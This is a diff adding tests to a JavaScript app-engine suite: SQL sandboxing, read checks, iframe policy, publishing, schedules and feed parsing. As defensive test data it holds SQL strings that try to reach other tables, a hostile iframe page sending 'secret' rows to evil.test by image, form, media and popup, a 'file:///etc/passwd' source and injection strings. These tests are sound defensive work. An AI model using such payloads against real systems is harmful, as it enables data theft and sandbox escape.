@@ -49,6 +49,59 @@ test('only SELECTs over the app\'s own tables', () => {
   assert.throws(() => rewriteSql('SELECT 1; DROP TABLE tasks', T, P), /one statement/);
 });
 
+// Audit G-B1: each of these reached another table unchecked. Every one must
+// be refused, whatever the message.
+test('app.sql cannot reach a table outside the app by quoting, commas, comments or odd tokens', () => {
+  const reach = [
+    'SELECT * FROM "sa_people"',
+    'SELECT * FROM `sa_people`',
+    'SELECT * FROM tasks, sa_people',
+    'SELECT * FROM tasks t, sa_people p WHERE t.id = p.id',
+    'SELECT * FROM tasks JOIN tags ON tags.task = tasks.id, sa_people',
+    'SELECT * FROM/**/sa_people',
+    'SELECT * FROM /* x */ sa_people',
+    'SELECT * FROM tasks WHERE id IN (SELECT id FROM/**/sa_sessions)',
+    // A CTE's name counts only inside the query that defines it.
+    'SELECT * FROM sa_people, (WITH sa_people AS (SELECT 1 AS x) SELECT * FROM sa_people) q',
+    'SELECT * FROM (WITH sa_people AS (SELECT 1 AS x) SELECT * FROM sa_people) q, sa_people',
+    // The tokenizer must end strings where ChloeDB's (sqlparser) does.
+    "SELECT E'x\\'' AS a, (SELECT email FROM sa_people) AS b, ''' AS c FROM tasks",
+    "SELECT $$ ' $$ AS a FROM sa_people --'",
+    "SELECT R'x' AS a FROM tasks",
+    // Number forms that end before a keyword: 1L, 0x, "1." then FROM.
+    'SELECT 1LFROM sa_people',
+    'SELECT 1.FROM sa_people',
+    'SELECT * FROM tasks 0xJOIN sa_people ON 1 = 1',
+    // Other ways to name a table.
+    'FROM sa_people SELECT *',
+    '(TABLE sa_people)',
+    'SELECT * FROM tasks |> JOIN sa_people ON 1 = 1',
+    'SELECT * FROM main.sa_people',
+    'SELECT * FROM tasks CROSS APPLY sa_people',
+    'SELECT * INTO sa_copy FROM tasks',
+    'SELECT * FROM LATERAL sa_people',
+    'SELECT * FROM (sa_people)',
+  ];
+  for (const sql of reach) {
+    assert.throws(() => rewriteSql(sql, T, P), Error, sql);
+  }
+  // And the shapes apps write stay as they were.
+  assert.equal(rewriteSql('SELECT * FROM tasks, tags WHERE tags.task = tasks.id', T, P).sql,
+    'SELECT * FROM app_abc123_tasks AS tasks, app_abc123_tags AS tags WHERE tags.task = tasks.id');
+  assert.equal(rewriteSql('SELECT "title" FROM tasks -- the list\n', T, P).sql,
+    'SELECT "title" FROM app_abc123_tasks AS tasks -- the list');
+  assert.equal(rewriteSql('SELECT x IS DISTINCT FROM y AS d, SUBSTRING(title FROM 2) AS s, TRIM(BOTH FROM title) AS t FROM tasks', T, P).sql,
+    'SELECT x IS DISTINCT FROM y AS d, SUBSTRING(title FROM 2) AS s, TRIM(BOTH FROM title) AS t FROM app_abc123_tasks AS tasks');
+  assert.equal(rewriteSql('SELECT * FROM (SELECT * FROM tasks) t JOIN (SELECT * FROM tags) g ON g.task = t.id', T, P).sql,
+    'SELECT * FROM (SELECT * FROM app_abc123_tasks AS tasks) t JOIN (SELECT * FROM app_abc123_tags AS tags) g ON g.task = t.id');
+  assert.equal(rewriteSql('SELECT t.from, :from AS f FROM tasks t WHERE t.at >= :from', T, P).sql,
+    'SELECT t.from, :from AS f FROM app_abc123_tasks t WHERE t.at >= :from');
+  assert.equal(rewriteSql('WITH a AS (SELECT * FROM tasks), b (n) AS (SELECT COUNT(*) FROM a) SELECT * FROM a, b', T, P).sql,
+    'WITH a AS (SELECT * FROM app_abc123_tasks AS tasks), b (n) AS (SELECT COUNT(*) FROM a) SELECT * FROM a, b');
+  assert.equal(rewriteSql('SELECT title FROM tasks UNION ALL SELECT name FROM people ORDER BY 1', T, P).sql,
+    'SELECT title FROM app_abc123_tasks AS tasks UNION ALL SELECT name FROM app_abc123_people AS people ORDER BY 1');
+});
+
 test('the answer parser keeps code verbatim', () => {
   const text = '<plan>{"views":[{"slug":"v1"}]}</plan>\n<code slug="v1">\nconst x = "</div>";\nroot.append(x)\n</code>';
   const { plan, code } = parseAnswer(text);
@@ -695,7 +748,7 @@ test('a rule is checked against the tables it writes, and needs no writer', asyn
     { update: 'features', id: ':row.feature', set: { votes: 'DELETE FROM features' } },
     { wat: 1 },
   ] }, cols).join('\n');
-  for (const want of ['give "id"', 'nope is not a column of features', 'no table "ghosts"', 'only SELECT here', 'a step is update, insert, upsert, remove, call, email, let, each, require or return']) assert.ok(p.includes(want), `missing ${want} in:\n${p}`);
+  for (const want of ['give "id"', 'nope is not a column of features', 'no table "ghosts"', 'only SELECT here', 'a step is update, insert, upsert, remove, call, email, pull, let, each, require or return']) assert.ok(p.includes(want), `missing ${want} in:\n${p}`);
   assert.match(checkRule({ query: 'UPDATE x SET a = 1' }).join(), /give a SELECT/);
   // In a plan: the rule becomes the function's code, is checked, and gets no writer.
   const plan = { ...brief, tables: [{ name: 'features', columns: [{ name: 'votes', type: 'int' }] }, { name: 'votes', columns: [{ name: 'feature', type: 'keyword' }] }],
@@ -1587,6 +1640,97 @@ test('the library SQL functions run in Strata', async (t) => {
   }
 });
 
+// Audit G-B1's backstop: whatever the rewrite lets through, the server's
+// plan says which tables a query reads, and one outside the app's is refused.
+test('the server\'s plan of an app query may read only the app\'s tables', async (t) => {
+  const { findServerBinary, startServer } = await import('../engine/strata.mjs');
+  const { checkReads, tablesOfPlan } = await import('../engine/sql.mjs');
+  const bin = findServerBinary(join(import.meta.dirname, '..', '..'));
+  if (!bin) return noServer(t);
+  const dir = mkdtempSync(join(tmpdir(), 'sa-reads-'));
+  const port = await new Promise((r) => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
+  const { child, client } = await startServer({ bin, db: join(dir, 'apps.strata'), listen: `127.0.0.1:${port}`, log: () => {} });
+  try {
+    await client.sql('CREATE TABLE app_x1_tasks (id KEYWORD PRIMARY KEY, title TEXT)');
+    await client.sql('CREATE TABLE sa_people (id KEYWORD PRIMARY KEY, email KEYWORD)');
+    await client.write([{ op: 'upsert', table: 'app_x1_tasks', doc: { id: 'a', title: 'one' } }, { op: 'upsert', table: 'sa_people', doc: { id: 'a', email: 'x@example.com' } }]);
+    const own = ['app_x1_tasks'];
+    await checkReads(client, 'SELECT * FROM app_x1_tasks AS tasks', {}, own);
+    assert.deepEqual([...tablesOfPlan((await client.explain('SELECT * FROM app_x1_tasks AS tasks', {})).ir)], ['app_x1_tasks']);
+    await assert.rejects(checkReads(client, 'SELECT * FROM "sa_people"', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'SELECT * FROM app_x1_tasks AS tasks JOIN "sa_people" p ON p.id = tasks.id', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'SELECT * FROM app_x1_tasks WHERE id IN (SELECT id FROM sa_people)', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'WITH p AS (SELECT * FROM sa_people) SELECT * FROM p', {}, own), /reads sa_people/);
+    // And through the engine, as a view's app.sql reaches it.
+    const { Engine } = await import('../engine/engine.mjs');
+    const engine = new Engine(client, { log: () => {} });
+    engine.view = async () => ({ tables: [{ spec: { name: 'tasks' } }] });
+    assert.deepEqual((await engine.sql('x1', 'SELECT title FROM tasks')).map((r) => r.title), ['one']);
+    await assert.rejects(engine.sql('x1', 'SELECT * FROM tasks JOIN "sa_people" p ON p.id = tasks.id'), /quotes/);
+    await assert.rejects(engine.sql('x1', 'SELECT * FROM tasks WHERE id IN (SELECT id FROM/**/sa_people)'), /block comments/);
+  } finally {
+    child.kill();
+  }
+});
+
+// Audit G-B2: a view's frame sent rows out through an image's URL or a popup.
+// In Chromium, a frame with the studio's sandbox and policy runs what a
+// hostile view would, and nothing reaches another host.
+test('a view frame cannot send data out through images, media, forms or popups', async (t) => {
+  const { frameCsp, FRAME_SANDBOX, linkToOpen, PHOTO_HOSTS } = await import('../web/policy.js');
+  const csp = frameCsp('http://127.0.0.1:1');
+  assert.doesNotMatch(csp, /img-src[^;]*https:(\s|;|$)/);
+  assert.match(csp, /form-action 'none'/);
+  assert.match(frameCsp('http://127.0.0.1:1', { hosts: ['*'] }), /img-src data: blob: http:\/\/127\.0\.0\.1:1 https:;/);
+  // Allowed hosts (and their subdomains) only; a name that is not a host adds nothing.
+  const some = frameCsp('http://127.0.0.1:1', { hosts: ['api.example.com', "x.com; script-src *", 'bad host'] });
+  assert.match(some, /img-src [^;]* https:\/\/api\.example\.com https:\/\/\*\.api\.example\.com;/);
+  assert.doesNotMatch(some, /img-src[^;]*https:(\s|;|$)|x\.com|bad/);
+  assert.ok(PHOTO_HOSTS.every((h) => csp.includes(h)));
+  assert.doesNotMatch(FRAME_SANDBOX, /allow-popups|allow-same-origin|allow-top-navigation/);
+  assert.equal(linkToOpen('javascript:alert(1)'), null);
+  assert.equal(linkToOpen('https://example.com/a'), 'https://example.com/a');
+  const { loadPlaywright } = await import('../engine/checks.mjs');
+  const pw = loadPlaywright();
+  if (!pw) return t.skip('no playwright');
+  const browser = await pw.chromium.launch();
+  try {
+    // A hostile view, in a frame made as the studio makes one.
+    const view = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${frameCsp('https://studio.test')}"></head><body>
+<form id="f" action="https://evil.test/form" method="get"><input name="rows" value="secret"></form>
+<a id="l" href="https://evil.test/link?rows=secret" target="_blank">x</a>
+<script>
+  new Image().src = 'https://evil.test/img?rows=secret';
+  const v = document.createElement('video'); v.src = 'https://evil.test/media?rows=secret'; document.body.append(v);
+  try { window.open('https://evil.test/open?rows=secret'); } catch (e) {}
+  try { document.getElementById('f').submit(); } catch (e) {}
+  new Image().src = 'https://studio.test/api/tiles/1/0/0.png';
+</script></body></html>`;
+    const ctx = await browser.newContext();
+    const seen = [];
+    await ctx.route('**/*', (r) => {
+      const u = r.request().url();
+      seen.push(u);
+      return r.fulfill(u === 'https://studio.test/' ? { contentType: 'text/html', body: '<!doctype html><body></body>' } : { status: 204, body: '' });
+    });
+    const page = await ctx.newPage();
+    await page.goto('https://studio.test/');
+    await page.evaluate(([sandbox, doc]) => {
+      const f = document.createElement('iframe');
+      f.setAttribute('sandbox', sandbox);
+      f.srcdoc = doc;
+      document.body.append(f);
+    }, [FRAME_SANDBOX, view]);
+    await page.waitForTimeout(800);
+    await page.frames()[1].click('#l', { timeout: 2000 }).catch(() => {});
+    await page.waitForTimeout(800);
+    assert.deepEqual(seen.filter((u) => u.includes('evil.test')), []);
+    assert.deepEqual(ctx.pages().length, 1);
+    // An image from the engine itself still loads.
+    assert.ok(seen.includes('https://studio.test/api/tiles/1/0/0.png'), seen.join(' '));
+  } finally { await browser.close(); }
+});
+
 // Against a real chloedb-server: what people do is stored with its columns
 // (session, screen, table, row, fields, words, results, time), and Strata
 // counts the patterns in it with the engine's table functions.
@@ -2116,8 +2260,8 @@ test('apps reach a model and the web only when switched on: cached answers, dail
   const looked = await new Promise((ok) => publicLookup('localhost', { all: true }, (e, a) => ok(e || a)));
   assert.match(String(looked.message), /localhost leads to (127\.0\.0\.1|::1), which is not on the public internet/);
   // what an app's code uses
-  assert.deepEqual(usesOf({ views: [{ code: 'const t = await app.ask(`Sum up ${x}`, {web: true})' }], functions: [{ code: 'function run(i, app) { return app.fetch(i.url).json; }' }] }), { ask: true, web: true, fetch: true });
-  assert.deepEqual(usesOf({ views: [{ code: 'app.sql("SELECT 1")' }] }), { ask: false, web: false, fetch: false });
+  assert.deepEqual(usesOf({ views: [{ code: 'const t = await app.ask(`Sum up ${x}`, {web: true})' }], functions: [{ code: 'function run(i, app) { return app.fetch(i.url).json; }' }] }), { ask: true, web: true, fetch: true, schedule: false, hosts: [], sends: false, secrets: [] });
+  assert.deepEqual(usesOf({ views: [{ code: 'app.sql("SELECT 1")' }] }), { ask: false, web: false, fetch: false, schedule: false, hosts: [], sends: false, secrets: [] });
 
   // switches, the cache and the limits, with a store and a model of our own
   const settings = new Map();
@@ -2146,7 +2290,7 @@ test('apps reach a model and the web only when switched on: cached answers, dail
   assert.deepEqual(await reach.ask('a1', 'Tag this: my card was charged twice', { json: true }), { tag: 'billing' });
   await assert.rejects(reach.ask('a1', 'A third question'), (e) => e.refused && /2 times today, its limit \(2\)/.test(e.message));
   assert.deepEqual(await reach.usage('a1'), { day: new Date().toISOString().slice(0, 10), asks: 2, cached: 1, fetches: 0, usd: 0.002 });
-  await reach.setSwitches('a1', { web: true, fetch: true, perDay: 10 });
+  await reach.setSwitches('a1', { web: true, fetch: true, perDay: 10, hosts: ['example.com'] });
   await reach.ask('a1', 'Find today\'s price', { web: true });
   assert.deepEqual(calls.at(-1).tools, ['WebSearch', 'WebFetch']);
   assert.ok(calls.at(-1).maxBudgetUsd > 0);
@@ -2232,5 +2376,459 @@ test('the engine\'s own browser opens the app with its cookie', async (t) => {
   } finally {
     useSelfCookie(null);
     srv.close();
+  }
+});
+
+// What an app is made of (engine/provenance.mjs): the lines the engine
+// generated from CREATE statements, the agent's own code, and the library's.
+test('provenance tells CREATE statements from code written from scratch and from reused pieces', async () => {
+  const { provenance, pieceOrigin } = await import('../engine/provenance.mjs');
+  const { fromSource, toSource } = await import('../engine/source.mjs');
+  const statement = `CREATE SCREEN guests TITLE 'Guests'
+LIST guests
+  ORDER BY name  SEARCH name
+  FORM (name REQUIRED, rsvp 'RSVP' SELECT ('yes', 'no'))
+  COLUMNS (name, rsvp 'RSVP' BADGE)
+  KPI 'Coming' = COUNT(*) WHERE rsvp = 'yes'`;
+  // A capability as the engine holds it: its SQL, and what it runs as.
+  const held = (c) => { const sql = toSource(c); const run = fromSource({ ...c, code: sql }); return { ...c, code: run.code, sql: run.sql, spec: { ...c.spec, ...(run.statement ? { statement: run.statement } : {}) } }; };
+  const screen = held({ id: 'a1/view/guests@1', kind: 'view', slug: 'guests', title: 'Guests', version: 1, author: 'forge', code: statement, spec: { screen: true, patterns: ['crud'] } });
+  const js = held({ id: 'a1/view/chart@1', kind: 'view', slug: 'chart', title: 'Chart', version: 1, author: 'forge', code: 'async function render(root, app) {\n  const rows = await app.sql("SELECT * FROM guests");\n\n  root.textContent = rows.length;\n}', spec: {} });
+  const table = held({ id: 'a1/table/guests@1', kind: 'table', slug: 'guests', title: 'guests', version: 1, author: 'forge', code: '', spec: { name: 'guests', columns: [{ name: 'name', type: 'text' }, { name: 'rsvp', type: 'keyword' }] } });
+  const starter = held({ id: 'a1/function/export-csv@1', kind: 'function', slug: 'export-csv', title: 'Export', version: 1, author: 'library', forked_from: 'lib/function/export-csv@1', code: 'async function run(input, app) {\n  return 1;\n}', spec: {} });
+  const builtin = { id: 'lib/component/barChart@1', kind: 'component', slug: 'barChart', title: 'Bar chart', version: 1, author: 'builtin', code: 'function component() {\n  return 1;\n}', spec: {} };
+  const mine = { id: 'lib/helper/odds@1', kind: 'helper', slug: 'odds', title: 'Odds', version: 1, author: 'forge', code: 'function helper() {\n  return {};\n}', spec: { by: 'a1' } };
+
+  const s = pieceOrigin(screen, 'a1');
+  assert.equal(s.origin, 'create');
+  assert.equal(s.statement, 'CREATE SCREEN');
+  assert.equal(s.wrote, 6);
+  assert.ok(s.runs > s.wrote * 3, `a CREATE SCREEN expands into its pattern's screen (${s.wrote} -> ${s.runs})`);
+  assert.deepEqual([pieceOrigin(js, 'a1').origin, pieceOrigin(js, 'a1').wrote], ['scratch', 4]);
+  assert.equal(pieceOrigin(table, 'a1').statement, 'CREATE TABLE');
+  assert.deepEqual([pieceOrigin(starter, 'a1').origin, pieceOrigin(starter, 'a1').wrote], ['reused', 0]);
+  assert.equal(pieceOrigin(builtin, 'a1').origin, 'reused');
+  assert.equal(pieceOrigin(mine, 'a1').origin, 'scratch');
+  assert.equal(pieceOrigin(mine, 'other').origin, 'reused', 'a shared piece another app wrote is reused');
+  // A screen patched since it was written as a statement is JSON the agent wrote.
+  assert.equal(pieceOrigin({ ...screen, spec: { ...screen.spec, derived: true } }, 'a1').origin, 'scratch');
+
+  const m = provenance({ app: { id: 'a1' }, comp: { n: 3 }, tables: [table], views: [screen, js], functions: [starter], components: [builtin], helpers: [mine] });
+  assert.equal(m.version, 3);
+  assert.equal(m.pieces.length, 6);
+  assert.equal(m.runs, m.pieces.reduce((a, p) => a + p.runs, 0));
+  const shares = Object.values(m.totals).reduce((a, t) => a + t.share, 0);
+  assert.ok(Math.abs(shares - 1) < 1e-9);
+  assert.equal(m.agent.wrote, m.totals.create.wrote + m.totals.scratch.wrote);
+  assert.ok(m.leverage > 1);
+  assert.deepEqual(m.pieces.map((p) => p.origin).slice(0, 2), ['create', 'create'], 'statements first');
+});
+
+test('a published app is open to the public at its own host, and nothing else is', async () => {
+  const { Publish, nameFor } = await import('../engine/publish.mjs');
+  assert.equal(nameFor("Kids' reading"), 'kids-reading');
+  assert.equal(nameFor('Café — Orders!'), 'cafe-orders');
+  assert.equal(nameFor('API'), 'app-api');
+  const rows = new Map();
+  const store = { db: { query: async () => [...rows].map(([app, value]) => ({ app, value })) }, putSetting: async (app, name, value) => rows.set(app, value) };
+  const pub = new Publish({ store, domain: 'apps.example.com', rate: { calls: 5, dear: 2 } });
+  await pub.load(true);
+  const req = (method, host, extra = {}) => ({ method, headers: { host, ...extra }, socket: { remoteAddress: '203.0.113.9' } });
+  const at = (p) => new URL(p, 'http://x');
+  // Not published: nothing of it is open.
+  assert.equal(await pub.allows(req('GET', 'engine:7730'), at('/a/a1')), null);
+  const out = await pub.set('a1', "Kids' reading", { on: true });
+  assert.deepEqual(out.urls, ['https://kids-reading.apps.example.com/']);
+  await assert.rejects(pub.set('a2', 'Other', { on: true, name: 'kids-reading' }), /another app is called/);
+  await assert.rejects(pub.set('a2', 'Other', { name: 'www' }), /kept for the service/);
+  await assert.rejects(pub.set('a2', 'Other', { hosts: ['x.apps.example.com'] }), /not a host of your own/);
+  assert.equal((await pub.set('a2', 'Other', { on: true, hosts: ['Books.Example.org.'] })).hosts[0], 'books.example.org');
+  const host = 'kids-reading.apps.example.com';
+  assert.equal(pub.appForHost(req('GET', `${host}:443`)), 'a1');
+  assert.equal(pub.appForHost(req('GET', 'books.example.org')), 'a2');
+  assert.deepEqual(await pub.allows(req('GET', host), at('/')), { app: 'a1', page: true });
+  assert.ok(await pub.allows(req('GET', 'engine'), at('/a/a1')));
+  assert.ok(await pub.allows(req('GET', host), at('/api/apps/a1')));
+  assert.ok((await pub.allows(req('POST', host), at('/api/apps/a1/insert'))).app === 'a1');
+  assert.ok((await pub.allows(req('POST', host), at('/api/apps/a1/ask'))).dear);
+  assert.ok((await pub.allows(req('GET', host), at('/studio.js'))).file);
+  // How it is made, other apps, versions to try and the studio's own calls stay shut.
+  for (const [m, p, h] of [['GET', '/api/apps', host], ['POST', '/api/apps/a1/requests', host], ['GET', '/api/apps/a1/activity', host],
+    ['POST', '/api/apps/a1/publish', host], ['GET', '/api/apps/a1?v=2', host], ['GET', '/api/apps/a2', host], ['GET', '/api/kit', host],
+    ['GET', '/', 'engine'], ['GET', '/api/stream', host], ['POST', '/api/apps/a1/screens/books', host]]) {
+    assert.equal(await pub.allows(req(m, h), at(p)), null, `${m} ${p} on ${h}`);
+  }
+  assert.ok(await pub.allows(req('GET', host), at('/api/stream?app=a1')));
+  // A visitor's rate: 5 calls a minute, 2 of them dear.
+  const r = req('POST', host, { 'x-forwarded-for': '198.51.100.7, 10.0.0.1' });
+  assert.equal(pub.limit(r, true), null);
+  assert.equal(pub.limit(r, true), null);
+  assert.ok(pub.limit(r, true) > 0);
+  assert.equal(pub.limit(req('POST', host, { 'x-forwarded-for': '198.51.100.8' }), false), null);
+  // Switched off: shut again, at every address.
+  await pub.set('a1', "Kids' reading", { on: false });
+  assert.equal(await pub.allows(req('GET', host), at('/')), null);
+  assert.equal(await pub.allows(req('GET', 'engine'), at('/a/a1')), null);
+});
+
+test('schedules: EVERY read and said back, the next time in a time zone, and a run missed while away runs once', async () => {
+  const { parseEvery, everyText, everyWords, nextRun } = await import('../engine/schedule.mjs');
+  const cases = {
+    'EVERY HOUR': { unit: 'hour', n: 1, at: null, days: null, tz: 'UTC' },
+    'every 30 minutes': { unit: 'minute', n: 30, at: null, days: null, tz: 'UTC' },
+    'EVERY 120 MINUTES': { unit: 'hour', n: 2, at: null, days: null, tz: 'UTC' },
+    "EVERY DAY AT '07:00' TZ 'Europe/Madrid'": { unit: 'day', n: 1, at: '07:00', days: null, tz: 'Europe/Madrid' },
+    "every 3 days at '6'": { unit: 'day', n: 3, at: '06:00', days: null, tz: 'UTC' },
+    "EVERY MONDAY AT '09:30'": { unit: 'week', n: 1, at: '09:30', days: [1], tz: 'UTC' },
+    "EVERY WEEKDAY AT '08:00'": { unit: 'week', n: 1, at: '08:00', days: [1, 2, 3, 4, 5], tz: 'UTC' },
+    "EVERY MONDAY AND THURSDAY AT '08:00'": { unit: 'week', n: 1, at: '08:00', days: [1, 4], tz: 'UTC' },
+    "EVERY WEEK ON FRIDAY AT '17:00'": { unit: 'week', n: 1, at: '17:00', days: [5], tz: 'UTC' },
+  };
+  for (const [text, want] of Object.entries(cases)) {
+    const e = parseEvery(text);
+    assert.deepEqual(e, want, text);
+    assert.deepEqual(parseEvery(everyText(e)), e, `${text} said back as ${everyText(e)}`);
+  }
+  assert.equal(everyWords(parseEvery("EVERY DAY AT '07:00' TZ 'europe/madrid'")), 'every day at 07:00 (Europe/Madrid)');
+  for (const [bad, why] of [['EVERY 5 MINUTES', /at most every 15 minutes/], ["EVERY HOUR AT '07:00'", /AT and ON are for days/], ["EVERY DAY AT '25:00'", /not a time of day/],
+    ["EVERY DAY TZ 'Mars/Olympus'", /not a time zone/], ['EVERY FORTNIGHT', /say EVERY/], ['EVERY 2 WEEKS', /not every few weeks/], ['', /give when it runs/]]) assert.throws(() => parseEvery(bad), why, bad);
+
+  const t = (iso) => Date.parse(iso);
+  const hourly = parseEvery('EVERY 2 HOURS');
+  assert.equal(nextRun(hourly, t('2026-11-12T10:00:00Z')), t('2026-11-12T10:00:00Z'), 'a count of hours runs at once the first time');
+  assert.equal(nextRun(hourly, t('2026-11-12T10:30:00Z'), t('2026-11-12T10:00:00Z')), t('2026-11-12T12:00:00Z'));
+  assert.equal(nextRun(hourly, t('2026-11-13T09:00:00Z'), t('2026-11-12T10:00:00Z')), t('2026-11-13T09:00:00Z'), 'missed while away: once now');
+  // 07:00 in Madrid is 06:00Z in winter and 05:00Z after the clocks go forward (29 March 2026)
+  const madrid = parseEvery("EVERY DAY AT '07:00' TZ 'Europe/Madrid'");
+  assert.equal(new Date(nextRun(madrid, t('2026-03-28T05:00:00Z'))).toISOString(), '2026-03-28T06:00:00.000Z');
+  assert.equal(new Date(nextRun(madrid, t('2026-03-28T06:00:00Z'))).toISOString(), '2026-03-29T05:00:00.000Z');
+  assert.equal(new Date(nextRun(parseEvery("EVERY DAY AT '09:00' TZ 'America/New_York'"), t('2026-11-12T15:00:00Z'))).toISOString(), '2026-11-13T14:00:00.000Z');
+  // Friday 13 November 2026 after 08:00: the next weekday is Monday
+  assert.equal(new Date(nextRun(parseEvery("EVERY WEEKDAY AT '08:00'"), t('2026-11-13T09:00:00Z'))).toISOString(), '2026-11-16T08:00:00.000Z');
+  assert.equal(new Date(nextRun(parseEvery("EVERY 3 DAYS AT '06:00'"), t('2026-11-12T07:00:00Z'), t('2026-11-12T06:00:00Z'))).toISOString(), '2026-11-15T06:00:00.000Z');
+});
+
+test('CREATE SOURCE and EVERY compile into a rule on a schedule, stored as the statement and read back', async () => {
+  const { compileRule, ruleStatement, compileRuleStatements } = await import('../engine/rulesql.mjs');
+  const { toSource, fromSource, storedSpec } = await import('../engine/source.mjs');
+  const src = "CREATE SOURCE news FROM FEED 'https://news.example.com/rss' EVERY 1 HOUR INTO stories (title, link, published, summary, headline = title) KEY link LIMIT 20";
+  const out = compileRule(src);
+  assert.equal(out.source, true);
+  assert.deepEqual(out.every, { unit: 'hour', n: 1, at: null, days: null, tz: 'UTC' });
+  assert.deepEqual(out.rule.steps, [{ pull: { from: 'feed', url: 'https://news.example.com/rss', into: 'stories', cols: { title: 'title', link: 'link', published: 'published', summary: 'summary', headline: 'title' }, key: 'link', limit: 20 } }]);
+  const back = ruleStatement('news', out.rule, null, out.every, true);
+  assert.match(back, /^CREATE SOURCE news FROM FEED 'https:\/\/news\.example\.com\/rss' EVERY HOUR INTO stories/);
+  assert.deepEqual(compileRule(back).rule, out.rule);
+  const json = compileRule("CREATE SOURCE rates FROM JSON 'https://api.example.com/v1/rates' AT 'data.items' SECRET 'rates' EVERY DAY AT '06:00' TZ 'Europe/London' INTO rates (currency = code, rate = value.mid) KEY currency");
+  assert.deepEqual(json.rule.steps[0].pull, { from: 'json', url: 'https://api.example.com/v1/rates', at: 'data.items', secret: 'rates', into: 'rates', cols: { currency: 'code', rate: 'value.mid' }, key: 'currency' });
+  assert.deepEqual(compileRule(ruleStatement('rates', json.rule, null, json.every, true)), { ...json, name: 'rates' });
+  const brief = "CREATE RULE brief EVERY DAY AT '07:00' TZ 'Europe/Madrid' AS\n  SEND EMAIL TO 'me@example.com' SUBJECT 'Your brief' ROWS (SELECT title, link FROM stories ORDER BY published DESC LIMIT 15) NONE 'Nothing new';";
+  const b = compileRule(brief);
+  assert.equal(b.every.at, '07:00');
+  const said = ruleStatement('brief', b.rule, null, b.every);
+  assert.match(said, /^CREATE RULE brief EVERY DAY AT '07:00' TZ 'Europe\/Madrid' AS/);
+  // inside a rule, PULL from addresses kept in a table
+  const many = compileRule("CREATE RULE all_feeds EVERY 2 HOURS AS FOR f IN (SELECT url FROM feeds) DO PULL FEED :f.url INTO stories (title, link) KEY link AS got; END;");
+  assert.deepEqual(many.rule.steps[0].do[0], { pull: { from: 'feed', url: ':f.url', into: 'stories', cols: { title: 'title', link: 'link' }, key: 'link' }, as: 'got' });
+  assert.match(ruleStatement('all_feeds', many.rule, null, many.every), /PULL FEED :f\.url INTO stories \(title, link\) KEY link AS got/);
+  for (const [bad, why] of [
+    ["CREATE RULE x EVERY 5 MINUTES AS DELETE FROM t WHERE id = 1", /at most every 15 minutes/],
+    ["CREATE RULE x EVERY DAY AFTER INSERT ON t AS DELETE FROM t WHERE id = 1", /not both/],
+    ["CREATE RULE x EVERY DAY AS SELECT 1", /a SELECT alone on a schedule/],
+    ["CREATE SOURCE s FROM FEED 'https://a.example/rss' INTO t (title) KEY title", /give EVERY/],
+    ["CREATE SOURCE s FROM FEED 'https://a.example/rss' EVERY HOUR INTO t (body) KEY body", /fields are title, link/],
+    ["CREATE SOURCE s FROM FEED 'https://a.example/rss' EVERY HOUR INTO t (title) KEY link", /not among the columns/],
+    ["CREATE SOURCE s FROM FEED 'file:///etc/passwd' EVERY HOUR INTO t (title) KEY title", /not an http or https address/],
+    ["CREATE SOURCE s FROM FEED 'https://a.example/rss' AT 'x' EVERY HOUR INTO t (title) KEY title", /AT says where the list is in a JSON answer/],
+  ]) assert.throws(() => compileRule(bad), why, bad);
+  // a plan's statement becomes the function's rule, schedule and source mark
+  const plan = { functions: [{ slug: 'news' }, { slug: 'brief' }] };
+  assert.deepEqual(compileRuleStatements(plan, { news: src, brief }), []);
+  assert.equal(plan.functions[0].source, true);
+  assert.equal(plan.functions[1].every.tz, 'Europe/Madrid');
+  // stored as the statement, read back as the rule
+  const spec = { on: null, every: out.every, source: true, rule: true, statement: src };
+  const sql = toSource({ kind: 'function', slug: 'news', code: JSON.stringify(out.rule), spec });
+  assert.equal(sql, src);
+  const read = fromSource({ kind: 'function', slug: 'news', code: sql, spec: storedSpec('function', spec, sql) });
+  assert.deepEqual(JSON.parse(read.code), out.rule);
+  assert.equal(read.statement, src);
+  // a JavaScript function on a schedule says so in its wrapper
+  assert.match(toSource({ kind: 'function', slug: 'tidy', code: 'function run() { return 1; }', spec: { every: out.every } }), /^CREATE FUNCTION tidy EVERY HOUR LANGUAGE javascript AS/);
+});
+
+test('feeds: RSS, Atom and RDF items as the same fields; JSON lists by path', async () => {
+  const { parseFeed, jsonItems, at } = await import('../engine/feeds.mjs');
+  const rss = `<?xml version="1.0"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title>News</title><link>https://news.example.com/</link>
+    <item><title><![CDATA[Rates <b>held</b> & steady]]></title><link>https://news.example.com/a</link><guid isPermaLink="false">id-a</guid><pubDate>Thu, 12 Nov 2026 07:00:00 GMT</pubDate>
+      <description>&lt;p&gt;The bank kept rates.&lt;/p&gt;&lt;img src="/i/a.jpg"&gt;</description><content:encoded><![CDATA[<p>Full text here.</p>]]></content:encoded><dc:creator>Ana</dc:creator><category>Economy</category><category>Banks</category></item>
+    <item><title>Second</title><link>/b</link><enclosure url="https://cdn.example.com/b.jpg" type="image/jpeg"/></item></channel></rss>`;
+  const items = parseFeed(rss, 'https://news.example.com/rss');
+  assert.equal(items.length, 2);
+  assert.deepEqual({ ...items[0], content: items[0].content }, { title: 'Rates held & steady', link: 'https://news.example.com/a', guid: 'id-a', published: '2026-11-12T07:00:00.000Z', updated: '2026-11-12T07:00:00.000Z', summary: 'The bank kept rates.', content: 'Full text here.', author: 'Ana', categories: 'Economy, Banks', image: 'https://news.example.com/i/a.jpg' });
+  assert.equal(items[1].link, 'https://news.example.com/b', 'a relative link is made whole');
+  assert.equal(items[1].image, 'https://cdn.example.com/b.jpg');
+  const atom = `<feed xmlns="http://www.w3.org/2005/Atom"><title>Blog</title><entry><title type="html">Hello &amp;amp; welcome</title><link rel="alternate" href="https://blog.example.com/hello"/><link rel="edit" href="https://blog.example.com/edit/1"/>
+    <id>tag:blog.example.com,2026:1</id><published>2026-11-10T10:00:00+01:00</published><updated>2026-11-11T10:00:00Z</updated><summary>Short</summary><content type="html">&lt;p&gt;Long &lt;em&gt;text&lt;/em&gt;&lt;/p&gt;</content><author><name>Bo</name></author><category term="intro"/></entry></feed>`;
+  const [a] = parseFeed(atom);
